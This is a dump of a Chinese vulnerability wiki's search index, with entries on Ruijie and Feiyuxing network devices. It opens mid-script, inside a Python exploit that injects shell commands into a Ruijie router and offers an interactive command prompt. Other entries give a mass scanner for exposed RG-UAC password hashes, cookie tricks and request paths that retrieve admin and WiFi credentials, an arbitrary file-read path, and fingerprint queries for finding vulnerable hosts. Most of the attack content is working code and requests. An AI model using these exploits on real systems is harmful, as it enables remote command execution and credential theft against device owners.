\\033[34mPOC_Des: http://wiki.peiqi.tech \\033[0m') print('+ \\033[34mGithub : https://github.com/PeiQi0 \\033[0m') print('+ \\033[34m公众号 : PeiQi文库 \\033[0m') print('+ \\033[34mVersion: 锐捷网络-EWEB网管系统 \\033[0m') print('+ \\033[36m使用格式: python3 poc.py \\033[0m') print('+ \\033[36mUrl \u003e\u003e\u003e http://xxx.xxx.xxx.xxx \\033[0m') print('+------------------------------------------') def POC_1(target_url): vuln_url = target_url + \"/guest_auth/guestIsUp.php\" headers = { \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.141 Safari/537.36\", \"Content-Type\": \"application/x-www-form-urlencoded\", } data = \"mac=1\u0026ip=127.0.0.1| whoami \u003e test_test.txt\" try: requests.packages.urllib3.disable_warnings(InsecureRequestWarning) response = requests.post(url=vuln_url, headers=headers, data=data,verify=False, timeout=5) if response.status_code == 200: print(\"\\033[32m[o] 目标{}存在漏洞, 执行命令 whoami \\033[0m\".format(target_url)) requests.packages.urllib3.disable_warnings(InsecureRequestWarning) response = requests.get(url=target_url + \"/guest_auth/test_test.txt\", headers=headers, data=data, verify=False, timeout=5) print(\"\\033[32m[o] 响应为： {} \\033[0m\".format(response.text)) while True: cmd = input(\"\\033[35mCmd \u003e\u003e\u003e \\033[0m\") if cmd == \"exit\": sys.exit(0) else: POC_2(target_url, cmd) else: print(\"\\033[31m[x] 目标不存在漏洞 \\033[0m\") sys.exit(0) except Exception as e: print(\"\\033[31m[x] 请求失败 \\033[0m\", e) def POC_2(target_url, cmd): vuln_url = target_url + \"/guest_auth/guestIsUp.php\" headers = { \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.141 Safari/537.36\", \"Content-Type\": \"application/x-www-form-urlencoded\", } data = \"mac=1\u0026ip=127.0.0.1| {} \u003e test_test.txt\".format(cmd) try: requests.packages.urllib3.disable_warnings(InsecureRequestWarning) response = requests.post(url=vuln_url, headers=headers, data=data,verify=False, timeout=5) if response.status_code == 200: requests.packages.urllib3.disable_warnings(InsecureRequestWarning) response = requests.get(url=target_url + \"/guest_auth/test_test.txt\", headers=headers, data=data,verify=False, timeout=5) print(\"\\033[32m[o] 响应为： \\n{} \\033[0m\".format(response.text)) except Exception as e: print(\"\\033[31m[x] 请求失败 \\033[0m\", e) if __name__ == '__main__': title() target_url = str(input(\"\\033[35mPlease input Attack Url\\nUrl \u003e\u003e\u003e \\033[0m\")) POC_1(target_url) ","date":"0001-01-01","objectID":"/%E9%94%90%E6%8D%B7-nbr%E8%B7%AF%E7%94%B1%E5%99%A8-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cnvd-2021-09650/:5:0","tags":null,"title":"","uri":"/%E9%94%90%E6%8D%B7-nbr%E8%B7%AF%E7%94%B1%E5%99%A8-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cnvd-2021-09650/"},{"categories":null,"content":"锐捷 RG-UAC 账号密码信息泄露 CNVD-2021-14536 ","date":"0001-01-01","objectID":"/%E9%94%90%E6%8D%B7-rg-uac-%E8%B4%A6%E5%8F%B7%E5%AF%86%E7%A0%81%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2-cnvd-2021-14536/:0:0","tags":null,"title":"","uri":"/%E9%94%90%E6%8D%B7-rg-uac-%E8%B4%A6%E5%8F%B7%E5%AF%86%E7%A0%81%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2-cnvd-2021-14536/"},{"categories":null,"content":"漏洞描述 锐捷RG-UAC统一上网行为管理审计系统存在账号密码信息泄露,可以间接获取用户账号密码信息登录后台 ","date":"0001-01-01","objectID":"/%E9%94%90%E6%8D%B7-rg-uac-%E8%B4%A6%E5%8F%B7%E5%AF%86%E7%A0%81%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2-cnvd-2021-14536/:1:0","tags":null,"title":"","uri":"/%E9%94%90%E6%8D%B7-rg-uac-%E8%B4%A6%E5%8F%B7%E5%AF%86%E7%A0%81%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2-cnvd-2021-14536/"},{"categories":null,"content":"漏洞影响 锐捷RG-UAC统一上网行为管理审计系统 ","date":"0001-01-01","objectID":"/%E9%94%90%E6%8D%B7-rg-uac-%E8%B4%A6%E5%8F%B7%E5%AF%86%E7%A0%81%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2-cnvd-2021-14536/:2:0","tags":null,"title":"","uri":"/%E9%94%90%E6%8D%B7-rg-uac-%E8%B4%A6%E5%8F%B7%E5%AF%86%E7%A0%81%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2-cnvd-2021-14536/"},{"categories":null,"content":"网络测绘 title=\"RG-UAC登录页面\" ","date":"0001-01-01","objectID":"/%E9%94%90%E6%8D%B7-rg-uac-%E8%B4%A6%E5%8F%B7%E5%AF%86%E7%A0%81%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2-cnvd-2021-14536/:3:0","tags":null,"title":"","uri":"/%E9%94%90%E6%8D%B7-rg-uac-%E8%B4%A6%E5%8F%B7%E5%AF%86%E7%A0%81%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2-cnvd-2021-14536/"},{"categories":null,"content":"漏洞复现 来到登录页面 按F12查看源码,可以发现账号和密码的md5形式 解密md5得到密码后即可登录系统 ","date":"0001-01-01","objectID":"/%E9%94%90%E6%8D%B7-rg-uac-%E8%B4%A6%E5%8F%B7%E5%AF%86%E7%A0%81%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2-cnvd-2021-14536/:4:0","tags":null,"title":"","uri":"/%E9%94%90%E6%8D%B7-rg-uac-%E8%B4%A6%E5%8F%B7%E5%AF%86%E7%A0%81%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2-cnvd-2021-14536/"},{"categories":null,"content":"漏洞POC import requests import sys import random import re from requests.packages.urllib3.exceptions import InsecureRequestWarning def title(): print('+------------------------------------------') print('+ \\033[34mPOC_Des: http://wiki.peiqi.tech \\033[0m') print('+ \\033[34mGithub : https://github.com/PeiQi0 \\033[0m') print('+ \\033[34m公众号 : PeiQi文库 \\033[0m') print('+ \\033[34mVersion: 锐捷RG-UAC统一上网行为管理审计系统 \\033[0m') print('+ \\033[36m使用格式: python3 poc.py \\033[0m') print('+ \\033[36mFile \u003e\u003e\u003e ip.txt \\033[0m') print('+------------------------------------------') def POC_1(target_url): vuln_url = target_url headers = { \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\", } try: requests.packages.urllib3.disable_warnings(InsecureRequestWarning) response = requests.get(url=vuln_url, headers=headers, verify=False, timeout=5) if \"super_admin\" in response.text and \"password\" in response.text and response.status_code == 200: print(\"\\033[32m[o] 目标 {}存在漏洞 ,F12查看源码获取密码md5值 \\033[0m\".format(target_url)) else: print(\"\\033[31m[x] 目标 {}不存在漏洞 \\033[0m\".format(target_url)) except Exception as e: print(\"\\033[31m[x] 目标 {}不存在漏洞 \\033[0m\".format(target_url)) def Scan(file_name): with open(file_name, \"r\", encoding='utf8') as scan_url: for url in scan_url: if url[:4] != \"http\": url = \"http://\" + url url = url.strip('\\n') try: POC_1(url) except Exception as e: print(\"\\033[31m[x] 请求报错 \\033[0m\".format(e)) continue if __name__ == '__main__': title() file_name = str(input(\"\\033[35mPlease input Attack File\\nFile \u003e\u003e\u003e \\033[0m\")) Scan(file_name) ","date":"0001-01-01","objectID":"/%E9%94%90%E6%8D%B7-rg-uac-%E8%B4%A6%E5%8F%B7%E5%AF%86%E7%A0%81%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2-cnvd-2021-14536/:5:0","tags":null,"title":"","uri":"/%E9%94%90%E6%8D%B7-rg-uac-%E8%B4%A6%E5%8F%B7%E5%AF%86%E7%A0%81%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2-cnvd-2021-14536/"},{"categories":null,"content":"锐捷 Smartweb管理系统 密码信息泄露漏洞 CNVD-2021-17369 ","date":"0001-01-01","objectID":"/%E9%94%90%E6%8D%B7-smartweb%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F-%E5%AF%86%E7%A0%81%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E-cnvd-2021-17369/:0:0","tags":null,"title":"","uri":"/%E9%94%90%E6%8D%B7-smartweb%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F-%E5%AF%86%E7%A0%81%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E-cnvd-2021-17369/"},{"categories":null,"content":"漏洞描述 锐捷网络股份有限公司无线smartweb管理系统存在逻辑缺陷漏洞，攻击者可从漏洞获取到管理员账号密码，从而以管理员权限登录。 ","date":"0001-01-01","objectID":"/%E9%94%90%E6%8D%B7-smartweb%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F-%E5%AF%86%E7%A0%81%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E-cnvd-2021-17369/:1:0","tags":null,"title":"","uri":"/%E9%94%90%E6%8D%B7-smartweb%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F-%E5%AF%86%E7%A0%81%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E-cnvd-2021-17369/"},{"categories":null,"content":"漏洞影响 锐捷网络股份有限公司 无线smartweb管理系统 ","date":"0001-01-01","objectID":"/%E9%94%90%E6%8D%B7-smartweb%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F-%E5%AF%86%E7%A0%81%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E-cnvd-2021-17369/:2:0","tags":null,"title":"","uri":"/%E9%94%90%E6%8D%B7-smartweb%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F-%E5%AF%86%E7%A0%81%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E-cnvd-2021-17369/"},{"categories":null,"content":"网络测绘 title=\"无线smartWeb--登录页面\" ","date":"0001-01-01","objectID":"/%E9%94%90%E6%8D%B7-smartweb%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F-%E5%AF%86%E7%A0%81%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E-cnvd-2021-17369/:3:0","tags":null,"title":"","uri":"/%E9%94%90%E6%8D%B7-smartweb%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F-%E5%AF%86%E7%A0%81%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E-cnvd-2021-17369/"},{"categories":null,"content":"漏洞复现 登录页面如下 默认存在 guest账户，账号密码为 guest/guest 其中登录的过程中搜索admin的数据后发现请求了一个文件 /web/xml/webuser-auth.xml，而且响应中包含了 admin密码的base64加密 解密就可以获得 admin管理员的密码，尝试直接请求 http://xxx.xxx.xxx.xxx/web/xml/webuser-auth.xml Cookie添加 Cookie: login=1; oid=1.3.6.1.4.1.4881.1.1.10.1.3; type=WS5302; auth=Z3Vlc3Q6Z3Vlc3Q%3D; user=guest 直接获得所有的账户的等级标志和base64加密的账号密码 ","date":"0001-01-01","objectID":"/%E9%94%90%E6%8D%B7-smartweb%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F-%E5%AF%86%E7%A0%81%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E-cnvd-2021-17369/:4:0","tags":null,"title":"","uri":"/%E9%94%90%E6%8D%B7-smartweb%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F-%E5%AF%86%E7%A0%81%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E-cnvd-2021-17369/"},{"categories":null,"content":"锐捷 SSL VPN 越权访问漏洞 ","date":"0001-01-01","objectID":"/%E9%94%90%E6%8D%B7-ssl-vpn-%E8%B6%8A%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/:0:0","tags":null,"title":"","uri":"/%E9%94%90%E6%8D%B7-ssl-vpn-%E8%B6%8A%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞描述 Ruijie SSL VPN 存在越权访问漏洞，攻击者在已知用户名的情况下，可以对账号进行修改密码和绑定手机的操作。并在未授权的情况下查看服务器资源 ","date":"0001-01-01","objectID":"/%E9%94%90%E6%8D%B7-ssl-vpn-%E8%B6%8A%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/:1:0","tags":null,"title":"","uri":"/%E9%94%90%E6%8D%B7-ssl-vpn-%E8%B6%8A%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞影响 Ruijie SSL VPN ","date":"0001-01-01","objectID":"/%E9%94%90%E6%8D%B7-ssl-vpn-%E8%B6%8A%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/:2:0","tags":null,"title":"","uri":"/%E9%94%90%E6%8D%B7-ssl-vpn-%E8%B6%8A%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"网络测绘 icon_hash=\"884334722\" || title=\"Ruijie SSL VPN\" ","date":"0001-01-01","objectID":"/%E9%94%90%E6%8D%B7-ssl-vpn-%E8%B6%8A%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/:3:0","tags":null,"title":"","uri":"/%E9%94%90%E6%8D%B7-ssl-vpn-%E8%B6%8A%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞复现 访问目标 http://xxx.xxx.xxx.xxx/cgi-bin/installjava.cgi POC请求包如下 GET /cgi-bin/main.cgi?oper=getrsc HTTP/1.1 Host: xxx.xxx.xxx.xxx Connection: close Pragma: no-cache Cache-Control: no-cache Upgrade-Insecure-Requests: 1 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.190 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9 Sec-Fetch-Site: none Sec-Fetch-Mode: navigate Sec-Fetch-User: ?1 Sec-Fetch-Dest: document Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7,zh-TW;q=0.6 Cookie: UserName=xm; SessionId=1; FirstVist=1; Skin=1; tunnel=1 其中注意的参数为 Cookie: UserName=xm; SessionId=1; FirstVist=1; Skin=1; tunnel=1 UserName 参数为已知用户名 在未知登录用户名的情况下 漏洞无法利用(根据请求包使用Burp进行用户名爆破) 用户名正确时会返回敏感信息 通过此方法知道用户名后可以通过漏洞修改账号参数 访问 http://xxx.xxx.xxx.xxx/cgi-bin/main.cgi?oper=showsvr\u0026encode=GBK\u0026username=liuw\u0026sid=1\u0026oper=showres 点击个人设置跳转页面即可修改账号信息 ","date":"0001-01-01","objectID":"/%E9%94%90%E6%8D%B7-ssl-vpn-%E8%B6%8A%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/:4:0","tags":null,"title":"","uri":"/%E9%94%90%E6%8D%B7-ssl-vpn-%E8%B6%8A%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"参考文章 https://mp.weixin.qq.com/s?__biz=MzU1NTkzMTYxOQ==\u0026mid=2247484601\u0026idx=1\u0026sn=d6d6f4496243d98e688667faff137973 ","date":"0001-01-01","objectID":"/%E9%94%90%E6%8D%B7-ssl-vpn-%E8%B6%8A%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/:5:0","tags":null,"title":"","uri":"/%E9%94%90%E6%8D%B7-ssl-vpn-%E8%B6%8A%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"锐捷 云课堂主机 pool 目录遍历漏洞 ","date":"0001-01-01","objectID":"/%E9%94%90%E6%8D%B7-%E4%BA%91%E8%AF%BE%E5%A0%82%E4%B8%BB%E6%9C%BA-pool-%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E/:0:0","tags":null,"title":"","uri":"/%E9%94%90%E6%8D%B7-%E4%BA%91%E8%AF%BE%E5%A0%82%E4%B8%BB%E6%9C%BA-pool-%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞描述 锐捷云课堂主机存在目录遍历漏洞，通过访问get请求/pool/，即可读取目录.导致敏感信息泄露. ","date":"0001-01-01","objectID":"/%E9%94%90%E6%8D%B7-%E4%BA%91%E8%AF%BE%E5%A0%82%E4%B8%BB%E6%9C%BA-pool-%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E/:1:0","tags":null,"title":"","uri":"/%E9%94%90%E6%8D%B7-%E4%BA%91%E8%AF%BE%E5%A0%82%E4%B8%BB%E6%9C%BA-pool-%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞影响 锐捷云课堂 ","date":"0001-01-01","objectID":"/%E9%94%90%E6%8D%B7-%E4%BA%91%E8%AF%BE%E5%A0%82%E4%B8%BB%E6%9C%BA-pool-%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E/:2:0","tags":null,"title":"","uri":"/%E9%94%90%E6%8D%B7-%E4%BA%91%E8%AF%BE%E5%A0%82%E4%B8%BB%E6%9C%BA-pool-%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"网络测绘 title=\"Ruijie\" \u0026\u0026 \"云课堂主机\" ","date":"0001-01-01","objectID":"/%E9%94%90%E6%8D%B7-%E4%BA%91%E8%AF%BE%E5%A0%82%E4%B8%BB%E6%9C%BA-pool-%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E/:3:0","tags":null,"title":"","uri":"/%E9%94%90%E6%8D%B7-%E4%BA%91%E8%AF%BE%E5%A0%82%E4%B8%BB%E6%9C%BA-pool-%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞复现 访问 http://xxx.xxx.xxx.xxx/pool 造成目录遍历 ","date":"0001-01-01","objectID":"/%E9%94%90%E6%8D%B7-%E4%BA%91%E8%AF%BE%E5%A0%82%E4%B8%BB%E6%9C%BA-pool-%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E/:4:0","tags":null,"title":"","uri":"/%E9%94%90%E6%8D%B7-%E4%BA%91%E8%AF%BE%E5%A0%82%E4%B8%BB%E6%9C%BA-pool-%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"锐捷 校园网自助服务系统 login_judge.jsf 任意文件读取漏洞 ","date":"0001-01-01","objectID":"/%E9%94%90%E6%8D%B7-%E6%A0%A1%E5%9B%AD%E7%BD%91%E8%87%AA%E5%8A%A9%E6%9C%8D%E5%8A%A1%E7%B3%BB%E7%BB%9F-login_judge.jsf-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/:0:0","tags":null,"title":"","uri":"/%E9%94%90%E6%8D%B7-%E6%A0%A1%E5%9B%AD%E7%BD%91%E8%87%AA%E5%8A%A9%E6%9C%8D%E5%8A%A1%E7%B3%BB%E7%BB%9F-login_judge.jsf-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞描述 锐捷 校园网自助服务系统 login_judge.jsf 接口存在任意文件读取漏洞，攻击者通过漏洞可以获取服务器中的敏感文件 ","date":"0001-01-01","objectID":"/%E9%94%90%E6%8D%B7-%E6%A0%A1%E5%9B%AD%E7%BD%91%E8%87%AA%E5%8A%A9%E6%9C%8D%E5%8A%A1%E7%B3%BB%E7%BB%9F-login_judge.jsf-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/:1:0","tags":null,"title":"","uri":"/%E9%94%90%E6%8D%B7-%E6%A0%A1%E5%9B%AD%E7%BD%91%E8%87%AA%E5%8A%A9%E6%9C%8D%E5%8A%A1%E7%B3%BB%E7%BB%9F-login_judge.jsf-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞影响 锐捷 校园网自助服务系统 ","date":"0001-01-01","objectID":"/%E9%94%90%E6%8D%B7-%E6%A0%A1%E5%9B%AD%E7%BD%91%E8%87%AA%E5%8A%A9%E6%9C%8D%E5%8A%A1%E7%B3%BB%E7%BB%9F-login_judge.jsf-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/:2:0","tags":null,"title":"","uri":"/%E9%94%90%E6%8D%B7-%E6%A0%A1%E5%9B%AD%E7%BD%91%E8%87%AA%E5%8A%A9%E6%9C%8D%E5%8A%A1%E7%B3%BB%E7%BB%9F-login_judge.jsf-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"网络测绘 body=\"校园网自助服务系统\" ","date":"0001-01-01","objectID":"/%E9%94%90%E6%8D%B7-%E6%A0%A1%E5%9B%AD%E7%BD%91%E8%87%AA%E5%8A%A9%E6%9C%8D%E5%8A%A1%E7%B3%BB%E7%BB%9F-login_judge.jsf-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/:3:0","tags":null,"title":"","uri":"/%E9%94%90%E6%8D%B7-%E6%A0%A1%E5%9B%AD%E7%BD%91%E8%87%AA%E5%8A%A9%E6%9C%8D%E5%8A%A1%E7%B3%BB%E7%BB%9F-login_judge.jsf-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞复现 登陆页面 poc /selfservice/selfservice/module/scgroup/web/login_judge.jsf?view=./WEB-INF/web.xml%3F ","date":"0001-01-01","objectID":"/%E9%94%90%E6%8D%B7-%E6%A0%A1%E5%9B%AD%E7%BD%91%E8%87%AA%E5%8A%A9%E6%9C%8D%E5%8A%A1%E7%B3%BB%E7%BB%9F-login_judge.jsf-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/:4:0","tags":null,"title":"","uri":"/%E9%94%90%E6%8D%B7-%E6%A0%A1%E5%9B%AD%E7%BD%91%E8%87%AA%E5%8A%A9%E6%9C%8D%E5%8A%A1%E7%B3%BB%E7%BB%9F-login_judge.jsf-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"飞鱼星 企业级智能上网行为管理系统 权限绕过信息泄露漏洞 ","date":"0001-01-01","objectID":"/%E9%A3%9E%E9%B1%BC%E6%98%9F-%E4%BC%81%E4%B8%9A%E7%BA%A7%E6%99%BA%E8%83%BD%E4%B8%8A%E7%BD%91%E8%A1%8C%E4%B8%BA%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F-%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/:0:0","tags":null,"title":"","uri":"/%E9%A3%9E%E9%B1%BC%E6%98%9F-%E4%BC%81%E4%B8%9A%E7%BA%A7%E6%99%BA%E8%83%BD%E4%B8%8A%E7%BD%91%E8%A1%8C%E4%B8%BA%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F-%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞描述 飞鱼星 企业级智能上网行为管理系统 存在权限绕过以及信息泄露漏洞，可以获取管理员权限以及用户密码 ","date":"0001-01-01","objectID":"/%E9%A3%9E%E9%B1%BC%E6%98%9F-%E4%BC%81%E4%B8%9A%E7%BA%A7%E6%99%BA%E8%83%BD%E4%B8%8A%E7%BD%91%E8%A1%8C%E4%B8%BA%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F-%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/:1:0","tags":null,"title":"","uri":"/%E9%A3%9E%E9%B1%BC%E6%98%9F-%E4%BC%81%E4%B8%9A%E7%BA%A7%E6%99%BA%E8%83%BD%E4%B8%8A%E7%BD%91%E8%A1%8C%E4%B8%BA%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F-%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞影响 飞鱼星 企业级智能上网行为管理系统 ","date":"0001-01-01","objectID":"/%E9%A3%9E%E9%B1%BC%E6%98%9F-%E4%BC%81%E4%B8%9A%E7%BA%A7%E6%99%BA%E8%83%BD%E4%B8%8A%E7%BD%91%E8%A1%8C%E4%B8%BA%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F-%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/:2:0","tags":null,"title":"","uri":"/%E9%A3%9E%E9%B1%BC%E6%98%9F-%E4%BC%81%E4%B8%9A%E7%BA%A7%E6%99%BA%E8%83%BD%E4%B8%8A%E7%BD%91%E8%A1%8C%E4%B8%BA%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F-%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"网络测绘 title=\"飞鱼星企业级智能上网行为管理系统\" ","date":"0001-01-01","objectID":"/%E9%A3%9E%E9%B1%BC%E6%98%9F-%E4%BC%81%E4%B8%9A%E7%BA%A7%E6%99%BA%E8%83%BD%E4%B8%8A%E7%BD%91%E8%A1%8C%E4%B8%BA%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F-%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/:3:0","tags":null,"title":"","uri":"/%E9%A3%9E%E9%B1%BC%E6%98%9F-%E4%BC%81%E4%B8%9A%E7%BA%A7%E6%99%BA%E8%83%BD%E4%B8%8A%E7%BD%91%E8%A1%8C%E4%B8%BA%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F-%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞复现 权限绕过参考上一篇 飞鱼星 家用智能路由 cookie.cgi 权限绕过 信息泄露POC /request_para.cgi?parameter=wifi_info #获取ALL WIFI账号密码 /request_para.cgi?parameter=wifi_get_5g_host #获取5GWIFI账号密码 /request_para.cgi?parameter=wifi_get_2g_host #获取2GWIFI账号密码 